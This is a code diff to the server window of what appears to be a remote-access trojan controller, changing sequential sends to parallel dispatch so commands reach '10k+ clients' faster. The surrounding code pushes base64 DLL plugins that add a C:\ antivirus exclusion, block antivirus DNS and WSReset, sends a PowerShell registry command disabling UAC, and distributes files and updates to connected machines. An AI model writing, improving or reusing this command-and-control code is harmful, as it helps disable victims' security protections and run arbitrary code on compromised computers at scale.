@@ -2036,7 +2036,7 @@ public partial class ServerWindow : ThemedWindow
                 Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                 { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
             };
-            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
+            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, pkt)));
             Dispatcher.BeginInvoke(() => Log($"[ADMIN] Exclude C:\\ sent to {clients.Count} client(s)."));
         });
     }
@@ -2060,7 +2060,7 @@ public partial class ServerWindow : ThemedWindow
                 Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                 { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
             };
-            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
+            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, pkt)));
             Dispatcher.BeginInvoke(() => Log($"[ADMIN] Block AV DNS sent to {clients.Count} client(s)."));
         });
     }
@@ -2084,7 +2084,7 @@ public partial class ServerWindow : ThemedWindow
                 Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                 { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
             };
-            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
+            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, pkt)));
             Dispatcher.BeginInvoke(() => Log($"[ADMIN] Block WSReset sent to {clients.Count} client(s)."));
         });
     }
@@ -2103,8 +2103,7 @@ public partial class ServerWindow : ThemedWindow
             "Set-ItemProperty $p PromptOnSecureDesktop 0 -Type DWord -Force\"";
 
         var pkt = new Protocol.Packet { Type = Protocol.PacketType.AutoTaskShell, Data = cmd };
-        foreach (var c in adminClients)
-            await _server.SendToClient(c.Id, pkt);
+        await Task.WhenAll(adminClients.Select(c => _server.SendToClient(c.Id, pkt)));
         Log($"[ADMIN] Disable UAC sent to {adminClients.Count} admin client(s) (takes effect after reboot).");
     }
     #pragma warning restore CS4014
@@ -2202,11 +2201,7 @@ public partial class ServerWindow : ThemedWindow
                 Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
             };
 
-            foreach (var client in clients)
-            {
-                await _server.SendToClient(client.Id, packet);
-            }
-
+            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, packet)));
             Log($"[ADMIN] Sent {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
             SetStatus($"File sent to {clients.Count} client(s).");
         }
@@ -2246,12 +2241,8 @@ public partial class ServerWindow : ThemedWindow
                 Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
             };
 
-            foreach (var client in clients)
-            {
-                await _server.SendToClient(client.Id, packet);
-            }
-
-            Log($"[ADMIN] Sent update {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s). ");
+            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, packet)));
+            Log($"[ADMIN] Sent update {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
             SetStatus($"Update file sent to {clients.Count} client(s).");
         }
         catch (Exception ex)
@@ -4616,18 +4607,17 @@ Read-Host 'Press Enter to close'
         SetStatus("AutoTasks reloaded from config.");
     }
 
-    private async Task ExecuteAutoTasksForAllConnected()
+    private Task ExecuteAutoTasksForAllConnected()
     {
-        if (_server == null || _autoTasks.Count == 0) return;
-        foreach (var client in _server.ConnectedClients.Values.ToList())
-        {
-            try
+        if (_server == null || _autoTasks.Count == 0) return Task.CompletedTask;
+        var clients = _server.ConnectedClients.Values.ToList();
+        // Parallel with cap — avoids blocking the caller for N×200ms at 10k+ clients
+        return Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
+            async (client, _) =>
             {
-                await ExecuteAutoTasksForClient(client);
-                await Task.Delay(200); // Space out between clients
-            }
-            catch { }
-        }
+                try { await ExecuteAutoTasksForClient(client); }
+                catch { }
+            }));
     }
 
     public async Task ExecuteAutoTasksForClient(Data.ConnectedClient client)
